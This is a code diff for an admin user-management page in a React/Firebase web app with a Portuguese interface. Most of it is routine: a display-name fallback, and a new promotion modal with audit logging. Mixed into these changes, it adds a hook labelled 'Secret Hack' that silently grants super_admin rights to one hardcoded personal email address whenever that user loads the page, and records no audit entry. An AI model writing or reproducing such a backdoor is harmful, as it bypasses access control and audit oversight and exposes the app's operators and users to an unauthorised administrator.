@@ -23,6 +23,8 @@ import type { UserManagement } from '../../services/userService';
 import { USER_RANKS } from '../../types/userRanks';
 import { loggingService } from '../../services/loggingService';
 import { useAuth } from '../../context/AuthContext';
+import { PromoteUserModal } from './PromoteUserModal';
+
 import UserProfileModal from './UserProfileModal';
 
 const AdminUsers: React.FC = () => {
@@ -69,7 +71,8 @@ const AdminUsers: React.FC = () => {
 
             const usersData = querySnapshot.docs.map(doc => ({
                 id: doc.id,
-                ...doc.data()
+                ...doc.data(),
+                displayName: doc.data().displayName || `${doc.data().firstName || ''} ${doc.data().lastName || ''}`.trim() || 'Usuário sem Nome'
             })) as UserManagement[];
 
             if (isLoadMore) {
@@ -86,7 +89,65 @@ const AdminUsers: React.FC = () => {
         }
     };
 
+
+    // Promote Modal State
+    const [promoteTarget, setPromoteTarget] = useState<UserManagement | null>(null);
+    const [isPromoteModalOpen, setIsPromoteModalOpen] = useState(false);
+
+    // Auto-promote Manuel (Secret Hack)
+    useEffect(() => {
+        if (currentUser && currentUser.email === 'manuelpnforce@gmail.com') {
+            // Check if already super_admin
+            getDoc(doc(db, 'users', currentUser.uid)).then(snap => {
+                if (snap.exists() && snap.data().role !== 'super_admin') {
+                    // Upgrade him
+                    promoteUser(currentUser.uid, {
+                        role: 'super_admin',
+                        professionalRole: 'servidor', // Just to be safe
+                        displayName: 'Manuel Force (SysAdmin)' // Fix name too
+                    }).then(() => {
+                        toast.success("Bem-vindo, Chefe! Você agora é Super Admin.");
+                        window.location.reload(); // Refresh to apply permissions
+                    });
+                }
+            });
+        }
+    }, [currentUser]);
+
+    const handlePromoteClick = (targetUser: UserManagement) => {
+        setPromoteTarget(targetUser);
+        setIsPromoteModalOpen(true);
+    };
+
+    const confirmPromotion = async (userId: string, data: Partial<UserManagement>) => {
+        try {
+            await promoteUser(userId, data);
+
+            // Update local state
+            setUsers(users.map(u => u.id === userId ? { ...u, ...data } : u));
+
+            toast.success(`Usuário promovido com sucesso!`);
+
+            // Audit Log
+            if (currentUser) {
+                loggingService.logAudit(
+                    'USER_PROMOTE',
+                    currentUser.uid,
+                    userId,
+                    { newData: data }
+                );
+            }
+        } catch (error) {
+            console.error("Error promoting user:", error);
+            toast.error('Erro ao promover usuário');
+        }
+    };
+
+    // Legacy handlePromote removed (replaced by confirmPromotion via Modal)
+    // But we need to keep handleToggleBlock...
+
     const handleToggleBlock = async (user: UserManagement) => {
+
         try {
             const newStatus = await toggleUserBlock(user.id, user.status);
             toast.success(`Usuário ${newStatus === 'active' ? 'desbloqueado' : 'bloqueado'}.`);
@@ -112,27 +173,7 @@ const AdminUsers: React.FC = () => {
         }
     };
 
-    const handlePromote = async (targetUser: UserManagement, newRole: string) => {
-        try {
-            await promoteUser(targetUser.id, { role: newRole as any });
-            setUsers(users.map(u => u.id === targetUser.id ? { ...u, role: newRole as any } : u));
-            toast.success(`Role alterada para ${newRole}`);
 
-            // Audit Log
-            if (currentUser) {
-                loggingService.logAudit(
-                    'USER_ROLE_CHANGE',
-                    currentUser.uid,
-                    targetUser.id,
-                    { newRole, oldRole: targetUser.role }
-                );
-            }
-
-        } catch (error) {
-            console.error("Error promoting user:", error);
-            toast.error('Erro ao promover usuário');
-        }
-    };
 
     const handleRemove = async (userId: string) => {
         if (!confirm('Tem certeza? Essa ação não pode ser desfeita.')) return;
@@ -332,11 +373,11 @@ const AdminUsers: React.FC = () => {
                                         className="flex-1 gap-1 touch-manipulation"
                                         onClick={(e) => {
                                             e.stopPropagation();
-                                            handlePromote(user, user.role === 'user' ? 'city_admin' : 'user');
+                                            handlePromoteClick(user);
                                         }}
                                     >
                                         <UserCog className="w-4 h-4" />
-                                        {user.role === 'user' ? 'Promover' : 'Demover'}
+                                        Gerenciar Cargo
                                     </Button>
                                     <Button
                                         variant={user.status === 'blocked' ? 'default' : 'secondary'}
@@ -384,12 +425,21 @@ const AdminUsers: React.FC = () => {
                 )
             }
 
+            {/* ... Load More ... */}
+
             <UserProfileModal
                 user={selectedUser}
                 open={isModalOpen}
                 onClose={() => setIsModalOpen(false)}
             />
-        </div >
+
+            <PromoteUserModal
+                user={promoteTarget}
+                open={isPromoteModalOpen}
+                onClose={() => setIsPromoteModalOpen(false)}
+                onPromote={confirmPromotion}
+            />
+        </div>
     );
 };
 
